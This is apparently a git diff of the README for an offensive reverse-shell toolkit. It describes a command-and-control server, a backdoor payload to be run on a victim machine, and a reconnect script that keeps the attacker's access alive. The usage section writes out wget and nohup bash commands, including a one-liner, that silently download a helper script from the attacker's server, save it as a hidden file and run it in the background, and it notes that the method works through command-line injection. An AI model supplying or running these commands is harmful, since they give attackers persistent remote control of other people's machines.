@@ -1,3 +1,24 @@
+# Files in question
+
+__server_shell.py__ [CNC - Command and Control script]
+- This file is to be ran on the CNC server system and listens for incoming connections made by an exploited machine via the client_payload script.
+- Once a connected is established - this acts as a reverse shell and executes commands on the client system.
+
+__client_payload.py__ [Reverse shell Backdoor]
+- This file initiates a connection from the host system to the CNC server machine (hacker machine).
+- This is intended to be downloaded/executed on a victim machine.
+- This file assumes python3 is installed.
+
+__client_connect.sh__ [Helper script - BASH]
+- This file is a helper to the client_payload script.
+- The goal here is to make sure if a connection is dropped - a new one will be re-initiated - allowing the CNC server to have realiable access to client machine.
+- Write this as bash script so most of the commands here are directly communicating at the command line level.
+
+___startup.sh__ [Helper script - BASH]
+- Prints on screen-instructions asking for the ip/port details of the CMC server (hacker machine) and where the client_payload is to be hosted. 
+- This scrpt also edits the client_payload.py, server_shell.py, and client_connect.sh to reflected the command line input.
+- Finally, this script tells you exactly which commands to run on CNC server and client machine to initiate a reverse shell (backdoor) attack. 
+
 # Usage
 
 Note: With all methods - there needs to be a way to run a command on the client machine to kick-off the connection to the CNC server (hacker's machine).
@@ -12,7 +33,6 @@ Run startup script
 Then follow on screen instructions.
 
 
-
 ## Method 2: Manual
 (works with cmd line injection)
 
@@ -25,7 +45,7 @@ Then follow on screen instructions.
 - - Download + Execute the client_connect.sh script (keeps reconnects the client if it disconnects)
 - - CNC server could host the client_connect.sh script.
 - - - This file must first be edited to match the host/port details you already have in use.
-- - - `wget -q <cnc_server_ip>:8080/client_connect.sh &> /dev/null ; 
+- - - `wget -q <cnc_server_ip>:8080/client_connect.sh &> /dev/null ;` 
 - - - `bash client_connect.sh &> /dev/null & `
 - - One-Liner
 - - - `{ wget -q -O .i.sh <cnc_server_ip>:8080/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }`
